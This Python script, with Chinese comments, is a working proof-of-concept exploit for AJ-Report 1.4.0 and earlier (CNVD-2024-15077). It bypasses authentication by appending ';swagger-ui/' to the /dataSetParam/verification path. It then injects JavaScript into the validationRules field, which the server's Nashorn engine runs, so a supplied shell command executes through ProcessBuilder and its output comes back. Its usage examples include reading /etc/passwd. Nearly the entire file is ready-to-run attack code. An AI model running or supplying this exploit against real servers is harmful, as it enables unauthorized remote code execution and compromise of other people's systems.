#!/usr/bin/env python3
"""
AJ-Report <= 1.4.0 认证绕过与远程代码执行 (CNVD-2024-15077) POC

漏洞原理：
  /dataSetParam/verification 接口未授权，且 validationRules 字段中的 JavaScript
  会被后端 Nashorn 引擎执行，从而可以通过 Java Runtime 执行系统命令。

用法：
  python cnvd-2024-15077.py -t http://target:9095 -c "id"
  python cnvd-2024-15077.py -t http://target:9095 -c "touch /tmp/success"
  python cnvd-2024-15077.py -t http://target:9095 -c "cat /etc/passwd" -p http://127.0.0.1:8080
"""

import argparse
import json
import sys
import requests

# 忽略 SSL 证书警告（用于 HTTPS 目标）
requests.packages.urllib3.disable_warnings()


def build_payload(command: str) -> dict:
    """
    构造包含恶意 JavaScript 的 JSON 请求体。
    自动处理简单命令（如 id）和带参数命令（通过 sh -c 执行）。
    """
    # 如果命令包含空格，则通过 sh -c 执行，否则直接作为可执行文件名
    if " " in command:
        cmd_parts = ["sh", "-c", command]
    else:
        cmd_parts = [command]

    # 拼接 Java 代码中的 ProcessBuilder 参数，并对双引号进行转义
    java_cmd = ", ".join(f'"{p.replace(chr(92), chr(92)*2).replace(chr(34), chr(92)+chr(34))}"' for p in cmd_parts)

    # 构造 JavaScript 函数，执行命令并返回输出
    js_code = (
        "function verification(data){"
        f"a = new java.lang.ProcessBuilder({java_cmd}).start().getInputStream();"
        "r=new java.io.BufferedReader(new java.io.InputStreamReader(a));"
        "ss='';"
        "while((line = r.readLine()) != null){ss+=line};"
        "return ss;"
        "}"
    )

    return {
        "ParamName": "",
        "paramDesc": "",
        "paramType": "",
        "sampleItem": "1",
        "mandatory": True,
        "requiredFlag": 1,
        "validationRules": js_code
    }


def exploit(target: str, command: str, proxy: str = None, timeout: int = 15):
    """
    发送恶意请求并尝试提取命令输出
    """
    url = target.rstrip("/") + "/dataSetParam/verification;swagger-ui/"
    print(f"[*] 目标地址: {url}")
    print(f"[*] 执行命令: {command}")

    payload = build_payload(command)
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Content-Type": "application/json;charset=UTF-8"
    }
    proxies = {"http": proxy, "https": proxy} if proxy else None

    try:
        resp = requests.post(
            url,
            json=payload,
            headers=headers,
            proxies=proxies,
            timeout=timeout,
            verify=False
        )
        print(f"[*] 响应状态码: {resp.status_code}")
        if resp.status_code == 200:
            # 尝试从 JSON 响应中提取命令输出，常见字段：data、msg、retData
            try:
                data = resp.json()
                # 优先从 data 字段提取
                result = data.get("data")
                if result and isinstance(result, str) and result.strip():
                    print("[+] 命令执行结果:")
                    print(result)
                else:
                    # 否则打印完整响应
                    print("[+] 原始响应（可能已包含执行结果）:")
                    print(json.dumps(data, indent=2, ensure_ascii=False))
            except json.JSONDecodeError:
                print("[+] 响应非 JSON，原始内容:")
                print(resp.text)
        else:
            print(f"[-] 请求失败，响应片段: {resp.text[:500]}")
    except requests.exceptions.RequestException as e:
        print(f"[-] 请求异常: {e}")


if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description="AJ-Report CNVD-2024-15077 RCE POC"
    )
    parser.add_argument("-t", "--target", required=True,
                        help="目标地址，如 http://192.168.1.1:9095")
    parser.add_argument("-c", "--command", required=True,
                        help="要执行的系统命令，如 'id' 或 'cat /etc/passwd'")
    parser.add_argument("-p", "--proxy", default=None,
                        help="HTTP 代理，如 http://127.0.0.1:8080")
    args = parser.parse_args()

    exploit(args.target, args.command, args.proxy)